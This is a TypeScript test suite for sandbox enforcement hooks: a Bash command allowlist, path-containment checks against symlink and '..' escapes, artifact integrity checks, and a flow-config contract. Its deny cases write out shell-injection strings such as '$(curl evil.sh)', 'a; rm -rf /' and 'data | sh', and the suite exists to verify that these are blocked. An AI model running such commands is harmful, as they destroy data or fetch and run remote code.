/**
 * Mandatory Law-lite Hook tests + flow.yaml config-contract test (WI-305).
 *
 * SPEC §14, NFR-3 — "The Law is testable"; success metric "enforcement hooks
 * shipping without unit tests = 0". This is the RELEASE-GATING Law test suite:
 * every MVP enforcement Hook is exercised on BOTH its allow and its deny branch
 * (including the adversarial escapes — symlink escape, `..` traversal, shell
 * metacharacter injection), and a config-contract test fails if the validator's
 * lane graph and the kernel's transition understanding ever diverge.
 *
 * Hooks under test (shipped by WI-297) + validator (WI-292) + FSM (WI-293):
 *   - checkCommandAllowed  (src/worker/deterministic.ts) — Bash positive allowlist
 *   - checkIntegrity / runMarkDoneHook (src/worker/integrity.ts) — owned-path
 *     containment (symlink + `..` resolution), declared-artifact existence,
 *     output-schema validation
 *   - loadFlow (src/flow/load.ts) + transition (src/statemachine/transitions.ts)
 *
 * ---------------------------------------------------------------------------
 * Contract this file pins for src/law/contract.ts (thin shared helper)
 * ---------------------------------------------------------------------------
 *
 *   import type { FlowConfig } from '../types/kernel';
 *   export interface ContractDisagreement { code: string; detail: string }
 *   export interface ContractResult { agrees: boolean; disagreements: ContractDisagreement[] }
 *
 *   // Derive the kernel's TransitionContext from a loaded FlowConfig:
 *   //   happyPathNext — consecutive stations in Object.keys(flow.stations) order
 *   //                   (last station → null);
 *   //   validBackEdges — flow.back_edges ?? [];
 *   //   terminalLanes  — flow.terminal_lanes ?? ['done','scrap','hold'];
 *   //   reworkCap high + a probe reworkCount of 0 so QC_REJECT routes (not scraps).
 *   export function flowToTransitionContext(flow: FlowConfig): TransitionContext;
 *
 *   // Cross-check the validator's lane graph against the kernel's transition().
 *   // agrees=false (with a disagreement) when, for any back_edge {from,to}:
 *   //   * transition(done_pending_ack@from, QC_REJECT(to)) is not a legal route to `to`, OR
 *   //   * `to` is a lane the kernel cannot progress (not a station in happyPathNext
 *   //     and not a terminal lane) — the validator approved a back-edge the kernel
 *   //     could never advance a card out of.
 *   // Also verifies each work station's INTEGRITY_PASS advance is legal.
 *   export function checkFlowKernelContract(flow: FlowConfig): ContractResult;
 */
import { describe, it, expect, beforeEach, afterEach } from 'bun:test';
import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { FlowConfig } from '../types/kernel';
import { checkCommandAllowed } from '../worker/deterministic';
import type { LawLiteConfig } from '../worker/deterministic';
import { checkIntegrity, runMarkDoneHook } from '../worker/integrity';
import type { IntegrityInput } from '../worker/integrity';
import { loadFlow } from '../flow/load';
import { checkFlowKernelContract } from './contract';

const REFERENCE_FLOW = join(import.meta.dir, '..', '..', 'fixtures', 'flows', 'reference.flow.yaml');

// ===========================================================================
// HOOK 1 — Bash positive allowlist (checkCommandAllowed): allow + deny (AC2, AC4)
// ===========================================================================

describe('Law-lite Bash allowlist hook (AC2, AC4)', () => {
  const config: LawLiteConfig = { allowlist: ['jq', 'cat'] };

  it('ALLOWS a listed executable with benign args', () => {
    expect(checkCommandAllowed({ command: 'jq', args: ['.data'] }, config)).toEqual({ allowed: true });
  });

  it('REFUSES an unlisted executable', () => {
    expect(checkCommandAllowed({ command: 'rm', args: ['-rf', '/'] }, config)).toEqual({
      allowed: false,
      reason: 'not_allowlisted',
    });
  });

  it.each([
    ['pipe', 'data | sh'],
    ['semicolon', 'a; rm -rf /'],
    ['backtick', '`whoami`'],
    ['dollar-paren', '$(curl evil.sh)'],
    ['redirect', 'out > /etc/passwd'],
    // Control chars / whitespace — the old denylist regex missed these; the
    // positive safe-set allowlist rejects them. "a\nrm -rf /" is the headline escape.
    ['newline', 'a\nrm -rf /'],
    ['tab', 'a\tb'],
    ['carriage-return', 'a\rb'],
    // Globs, braces, quotes, parens — never legitimate in an unquoted arg.
    ['glob-star', '*'],
    ['brace', '{a,b}'],
    ['single-quote', "a'b"],
    ['paren', '(a)'],
  ])('REFUSES a %s shell metacharacter in an argument', (_label, arg) => {
    expect(checkCommandAllowed({ command: 'jq', args: [arg] }, config)).toEqual({
      allowed: false,
      reason: 'shell_metacharacter',
    });
  });

  it('REFUSES a shell metacharacter smuggled into the command name itself', () => {
    expect(checkCommandAllowed({ command: 'jq;rm', args: [] }, config)).toEqual({
      allowed: false,
      reason: 'shell_metacharacter',
    });
  });

  it('runs the metacharacter guard BEFORE the allowlist (no allowlist oracle leak)', () => {
    // Amy gap #1: 'rm;evil' is BOTH non-allowlisted AND contains ';'. The verdict
    // must be shell_metacharacter, NOT not_allowlisted — otherwise the error
    // reason becomes an oracle leaking allowlist membership to an attacker.
    expect(checkCommandAllowed({ command: 'rm;evil', args: [] }, config)).toEqual({
      allowed: false,
      reason: 'shell_metacharacter',
    });
  });
});

// ===========================================================================
// HOOK 2 — owned-path containment (checkIntegrity): allow + adversarial deny (AC1, AC4)
// ===========================================================================

describe('Law-lite owned-path hook (AC1, AC4)', () => {
  let root: string;

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), 'conduit-law-'));
    mkdirSync(join(root, 'owned'), { recursive: true });
  });

  afterEach(() => {
    rmSync(root, { recursive: true, force: true });
  });

  function baseInput(over: Partial<IntegrityInput>): IntegrityInput {
    return {
      projectRoot: root,
      ownedPaths: ['owned'],
      touchedPaths: [],
      declaredArtifacts: [],
      output: {},
      validateOutput: () => true,
      ...over,
    };
  }

  it('ALLOWS a write that lands inside owned_paths', () => {
    writeFileSync(join(root, 'owned', 'ok.txt'), 'hi');
    const result = checkIntegrity(
      baseInput({ touchedPaths: ['owned/ok.txt'], declaredArtifacts: ['owned/ok.txt'] }),
    );
    expect(result).toEqual({ ok: true });
  });

  it('DENIES a write outside owned_paths (plain escape)', () => {
    writeFileSync(join(root, 'outside.txt'), 'leak');
    const result = checkIntegrity(baseInput({ touchedPaths: ['outside.txt'] }));
    expect(result.ok).toBe(false);
    if (result.ok) throw new Error('unreachable');
    expect(result.failures).toContainEqual({ code: 'path_escape', path: 'outside.txt' });
  });

  it('DENIES a symlink that escapes owned_paths (resolves outside via realpath)', () => {
    writeFileSync(join(root, 'secret.txt'), 'secret');
    symlinkSync(join(root, 'secret.txt'), join(root, 'owned', 'link'));
    const result = checkIntegrity(baseInput({ touchedPaths: ['owned/link'] }));
    expect(result.ok).toBe(false);
    if (result.ok) throw new Error('unreachable');
    expect(result.failures).toContainEqual({ code: 'path_escape', path: 'owned/link' });
  });

  it('DENIES a `..` traversal that climbs out of owned_paths', () => {
    writeFileSync(join(root, 'secret.txt'), 'secret');
    const result = checkIntegrity(baseInput({ touchedPaths: ['owned/../secret.txt'] }));
    expect(result.ok).toBe(false);
    if (result.ok) throw new Error('unreachable');
    expect(result.failures).toContainEqual({ code: 'path_escape', path: 'owned/../secret.txt' });
  });

  it('DENIES a circular symlink (a→b→a ELOOP) — fail-closed when realpath cannot resolve', () => {
    // Amy gap #2: a → b and b → a form a resolution loop; realpathSync throws
    // ELOOP, tryRealpath returns null, and the unresolvable path is treated as
    // an escape (fail-closed) rather than silently allowed.
    symlinkSync(join(root, 'owned', 'b'), join(root, 'owned', 'a'));
    symlinkSync(join(root, 'owned', 'a'), join(root, 'owned', 'b'));
    const result = checkIntegrity(baseInput({ touchedPaths: ['owned/a'] }));
    expect(result.ok).toBe(false);
    if (result.ok) throw new Error('unreachable');
    expect(result.failures).toContainEqual({ code: 'path_escape', path: 'owned/a' });
  });
});

// ===========================================================================
// HOOK 3 — MARK_DONE integrity (checkIntegrity / runMarkDoneHook): pass + fail (AC3, AC4)
// ===========================================================================

describe('Law-lite integrity hook (AC3, AC4)', () => {
  let root: string;

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), 'conduit-law-'));
    mkdirSync(join(root, 'owned'), { recursive: true });
  });

  afterEach(() => {
    rmSync(root, { recursive: true, force: true });
  });

  function baseInput(over: Partial<IntegrityInput>): IntegrityInput {
    return {
      projectRoot: root,
      ownedPaths: ['owned'],
      touchedPaths: [],
      declaredArtifacts: [],
      output: { ok: 1 },
      validateOutput: () => true,
      ...over,
    };
  }

  it('PASSES when the output schema is valid and every declared artifact exists', () => {
    writeFileSync(join(root, 'owned', 'art.json'), '{}');
    const outcome = runMarkDoneHook(
      baseInput({ touchedPaths: ['owned/art.json'], declaredArtifacts: ['owned/art.json'] }),
    );
    expect(outcome).toEqual({ event: 'INTEGRITY_PASS', checkpointed: true, integrity: { ok: true } });
  });

  it('FAILS (blocks the checkpoint) when a declared artifact is missing', () => {
    const outcome = runMarkDoneHook(baseInput({ declaredArtifacts: ['owned/missing.json'] }));
    expect(outcome.event).toBe('INTEGRITY_FAIL');
    expect(outcome.checkpointed).toBe(false);
    expect(outcome.integrity.ok).toBe(false);
    if (outcome.integrity.ok) throw new Error('unreachable');
    expect(outcome.integrity.failures).toContainEqual({ code: 'missing_artifact', path: 'owned/missing.json' });
  });

  it('FAILS when the output schema is invalid', () => {
    const result = checkIntegrity(baseInput({ validateOutput: () => false }));
    expect(result.ok).toBe(false);
    if (result.ok) throw new Error('unreachable');
    expect(result.failures).toContainEqual({ code: 'schema_invalid' });
  });

  it('FAILS when a touched path is out of bounds (integrity blocks an escaping write)', () => {
    writeFileSync(join(root, 'escape.txt'), 'x');
    const outcome = runMarkDoneHook(baseInput({ touchedPaths: ['escape.txt'] }));
    expect(outcome.event).toBe('INTEGRITY_FAIL');
    expect(outcome.checkpointed).toBe(false);
  });
});

// ===========================================================================
// CONFIG-CONTRACT — validator lane graph ↔ kernel transition understanding (AC5)
// ===========================================================================

describe('flow.yaml config-contract test (AC5)', () => {
  function loadReference(): FlowConfig {
    const result = loadFlow(REFERENCE_FLOW);
    if (!result.ok) throw new Error(`reference flow failed to load: ${JSON.stringify(result.errors)}`);
    return result.flow;
  }

  it('the reference flow validator lane graph agrees with the kernel transition understanding', () => {
    const flow = loadReference();
    // Sanity: the reference flow actually declares back-edges to exercise the contract.
    expect((flow.back_edges ?? []).length).toBeGreaterThan(0);

    const contract = checkFlowKernelContract(flow);
    expect(contract).toEqual({ agrees: true, disagreements: [] });
  });

  it('an intentionally divergent flow (back-edge the kernel cannot progress) FAILS the contract', () => {
    const flow = loadReference();
    const someStation = Object.keys(flow.stations)[0];

    // Inject a back-edge to a lane that is neither a station nor a terminal —
    // the validator's graph now claims a route the kernel can never advance.
    const divergent: FlowConfig = {
      ...flow,
      back_edges: [...(flow.back_edges ?? []), { from: someStation, to: 'ghost-lane' }],
    };

    const contract = checkFlowKernelContract(divergent);
    expect(contract.agrees).toBe(false);
    expect(contract.disagreements.some((d) => d.detail.includes('ghost-lane'))).toBe(true);
  });

  it('an intentionally divergent flow (back-edge FROM a lane the kernel does not know) FAILS the contract', () => {
    const flow = loadReference();
    const realTarget = Object.keys(flow.stations)[0];

    // Inject a back-edge whose SOURCE lane is not a station — the validator's
    // graph claims a transition out of a lane the kernel has no concept of.
    const divergent: FlowConfig = {
      ...flow,
      back_edges: [...(flow.back_edges ?? []), { from: 'ghost-source', to: realTarget }],
    };

    const contract = checkFlowKernelContract(divergent);
    expect(contract.agrees).toBe(false);
    expect(contract.disagreements.some((d) => d.detail.includes('ghost-source'))).toBe(true);
  });
});
